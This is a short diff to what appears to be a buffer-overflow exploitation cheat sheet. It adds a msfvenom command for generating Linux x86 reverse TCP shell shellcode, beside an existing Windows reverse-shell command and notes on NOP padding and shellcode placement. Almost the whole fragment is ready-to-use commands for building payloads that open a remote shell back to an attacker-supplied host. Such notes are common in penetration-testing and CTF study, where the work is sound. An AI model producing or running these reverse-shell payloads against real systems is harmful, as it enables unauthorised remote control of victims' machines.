@@ -42,6 +42,7 @@ Add code:
 	Add a few \x90 before shellcode to avoid shellcode being modify
 
 	msfvenom -p windows/shell_reverse_tcp LHOST=<IP>LPORT=<PORT> EXITFUNC=thread -f <Code Format> -a x86 -platform windows -b "\x00"
+	msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP>LPORT=<PORT> EXITFUNC=thread -f <Code Format> -b "\x00"
 
 ### Bonus: Running out of shell code space?
 Use the front of payload instead
